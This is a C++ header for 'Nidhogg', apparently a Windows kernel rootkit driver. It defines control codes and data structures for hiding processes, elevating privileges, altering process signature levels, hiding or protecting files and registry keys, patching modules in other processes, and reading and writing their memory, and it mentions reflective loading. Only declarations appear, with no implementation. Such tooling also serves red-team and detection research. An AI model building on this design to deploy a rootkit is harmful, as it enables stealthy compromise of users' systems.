#pragma once

// Includes.
#include "FastMutex.h"
#include "AutoLock.h"

// #define DRIVER_REFLECTIVELY_LOADED // Comment or uncomment it when you load the driver reflectively.
#define DRIVER_PREFIX "Nidhogg: "
#define DRIVER_DEVICE_NAME L"\\Device\\Nidhogg"
#define DRIVER_SYMBOLIC_LINK L"\\??\\Nidhogg"
#define DRIVER_TAG 'hdiN'
#define OB_CALLBACKS_ALTITUDE L"31105.6171"
#define REG_CALLBACK_ALTITUDE L"31122.6172"

// ** IOCTLS ********************************************************************************************
#define IOCTL_NIDHOGG_PROTECT_PROCESS CTL_CODE(0x8000, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_UNPROTECT_PROCESS CTL_CODE(0x8000, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_CLEAR_PROCESS_PROTECTION CTL_CODE(0x8000, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_HIDE_PROCESS CTL_CODE(0x8000, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_ELEVATE_PROCESS CTL_CODE(0x8000, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_SET_PROCESS_SIGNATURE_LEVEL CTL_CODE(0x8000, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_QUERY_PROTECTED_PROCESSES CTL_CODE(0x8000, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_NIDHOGG_PROTECT_FILE CTL_CODE(0x8000, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_UNPROTECT_FILE CTL_CODE(0x8000, 0x808, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_CLEAR_FILE_PROTECTION CTL_CODE(0x8000, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_QUERY_FILES CTL_CODE(0x8000, 0x80A, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_NIDHOGG_PROTECT_REGITEM CTL_CODE(0x8000, 0x80B, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_UNPROTECT_REGITEM CTL_CODE(0x8000, 0x80C, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_CLEAR_REGITEMS CTL_CODE(0x8000, 0x80D, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_QUERY_REGITEMS CTL_CODE(0x8000, 0x80E, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_NIDHOGG_PATCH_MODULE CTL_CODE(0x8000, 0x80F, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_WRITE_DATA CTL_CODE(0x8000, 0x810, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_READ_DATA CTL_CODE(0x8000, 0x811, METHOD_BUFFERED, FILE_ANY_ACCESS)
// *****************************************************************************************************

#define MAX_PATCHED_MODULES 256
#define MAX_PIDS 256
#define MAX_PATH 260
#define MAX_FILES 256
#define MAX_REG_ITEMS 256
#define REG_VALUE_LEN 260
#define REG_KEY_LEN 255
#define SUPPORTED_HOOKED_NTFS_CALLBACKS 1

// Prototypes.
NTSTATUS NidhoggEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath);
NTSTATUS CompleteIrp(PIRP Irp, NTSTATUS status = STATUS_SUCCESS, ULONG_PTR info = 0);
DRIVER_UNLOAD NidhoggUnload;
DRIVER_DISPATCH NidhoggDeviceControl, NidhoggCreateClose;
void ClearAll();

typedef NTSTATUS(NTAPI* tZwProtectVirtualMemory)(
	HANDLE ProcessHandle, 
	PVOID* BaseAddress, 
	SIZE_T* NumberOfBytesToProtect, 
	ULONG NewAccessProtection, 
	PULONG OldAccessProtection);

typedef NTSTATUS(NTAPI* tMmCopyVirtualMemory)(
	PEPROCESS SourceProcess, 
	PVOID SourceAddress, 
	PEPROCESS TargetProcess, 
	PVOID TargetAddress, 
	SIZE_T BufferSize, 
	KPROCESSOR_MODE PreviousMode, 
	PSIZE_T ReturnSize);

typedef PPEB(NTAPI* tPsGetProcessPeb)(
	PEPROCESS Process);

typedef NTSTATUS (NTAPI* tObReferenceObjectByName)(
	PUNICODE_STRING ObjectName,
	ULONG Attributes,
	PACCESS_STATE AccessState,
	ACCESS_MASK DesiredAccess,
	POBJECT_TYPE ObjectType,
	KPROCESSOR_MODE AccessMode,
	PVOID ParseContext,
	PVOID* Object);

typedef NTSTATUS(NTAPI* tNtfsIrpFunction)(
	PDEVICE_OBJECT DeviceObject,
	PIRP Irp);

typedef NTSTATUS(NTAPI* tIoCreateDriver)(
	PUNICODE_STRING DriverName,
	PDRIVER_INITIALIZE InitializationFunction
	);

// Globals.
PVOID RegistrationHandle = NULL;

struct EnabledFeatures {
	bool DriverReflectivelyLoaded = false;
	bool FunctionPatching		  = true;
	bool WriteData				  = true;
	bool ReadData				  = true;
	bool RegistryFeatures		  = true;
	bool ProcessProtection		  = true;
	bool FileProtection			  = true;
};
EnabledFeatures Features;

// --- ModuleUtils structs ----------------------------------------------------
struct DynamicImportedModulesGlobal {
	tObReferenceObjectByName ObReferenceObjectByName;
	tZwProtectVirtualMemory  ZwProtectVirtualMemory;
	tMmCopyVirtualMemory	 MmCopyVirtualMemory;
	tPsGetProcessPeb		 PsGetProcessPeb;

	void Init() {
		UNICODE_STRING routineName;
		RtlInitUnicodeString(&routineName, L"ZwProtectVirtualMemory");
		ZwProtectVirtualMemory = (tZwProtectVirtualMemory)MmGetSystemRoutineAddress(&routineName);
		RtlInitUnicodeString(&routineName, L"MmCopyVirtualMemory");
		MmCopyVirtualMemory = (tMmCopyVirtualMemory)MmGetSystemRoutineAddress(&routineName);
		RtlInitUnicodeString(&routineName, L"PsGetProcessPeb");
		PsGetProcessPeb = (tPsGetProcessPeb)MmGetSystemRoutineAddress(&routineName);
		RtlInitUnicodeString(&routineName, L"ObReferenceObjectByName");
		ObReferenceObjectByName = (tObReferenceObjectByName)MmGetSystemRoutineAddress(&routineName);
	}
};
DynamicImportedModulesGlobal dimGlobals;

struct PatchedModule {
	ULONG Pid;
	PVOID Patch;
	ULONG PatchLength;
	CHAR* FunctionName;
	WCHAR* ModuleName;
};

struct PkgReadWriteData {
	MODE Mode;
	ULONG Pid;
	SIZE_T Size;
	PVOID LocalAddress;
	PVOID RemoteAddress;
};
// ----------------------------------------------------------------------------

// --- ProcessUtils structs ---------------------------------------------------
struct ProcessesList {
	int PidsCount;
	ULONG Processes[MAX_PIDS];
};

struct ProcessSignature {
	ULONG Pid;
	UCHAR SignerType;
	UCHAR SignatureSigner;
};

struct ProcessGlobals {
	ProcessesList ProtectedProcesses;
	FastMutex Lock;

	void Init() {
		ProtectedProcesses.PidsCount = 0;
		Lock.Init();
	}
};
ProcessGlobals pGlobals;
// ----------------------------------------------------------------------------

// --- FilesUtils structs -----------------------------------------------------
struct FileItem {
	int FileIndex;
	WCHAR FilePath[MAX_PATH];
};

struct FilesList {
	int FilesCount;
	WCHAR* FilesPath[MAX_FILES];
};

struct NtfsCallback {
	PVOID Address;
	bool Activated;
};

struct FileGlobals {
	FilesList Files;
	FastMutex Lock;
	NtfsCallback Callbacks[SUPPORTED_HOOKED_NTFS_CALLBACKS];

	void Init() {
		Files.FilesCount = 0;

		for (int i = 0; i < SUPPORTED_HOOKED_NTFS_CALLBACKS; i++)
			Callbacks[i].Activated = false;

		Lock.Init();
	}
};
FileGlobals fGlobals;
// ----------------------------------------------------------------------------

// --- RegistryUtils structs --------------------------------------------------
struct RegItem {
	int RegItemsIndex;
	ULONG Type;
	WCHAR KeyPath[REG_KEY_LEN];
	WCHAR ValueName[REG_VALUE_LEN];
};

struct RegKeys {
	int KeysCount;
	WCHAR* KeysPath[MAX_REG_ITEMS];
};

struct RegValues {
	int ValuesCount;
	WCHAR* ValuesPath[MAX_REG_ITEMS];
	WCHAR* ValuesName[REG_VALUE_LEN];
};

struct RegItems {
	RegKeys Keys;
	RegValues Values;
};

struct RegistryGlobals {
	RegItems ProtectedItems;
	RegItems HiddenItems;
	LARGE_INTEGER RegCookie;
	FastMutex Lock;

	void Init() {
		ProtectedItems.Keys.KeysCount = 0;
		ProtectedItems.Values.ValuesCount = 0;
		HiddenItems.Keys.KeysCount = 0;
		HiddenItems.Values.ValuesCount = 0;
		Lock.Init();
	}
};
RegistryGlobals rGlobals;
// ----------------------------------------------------------------------------
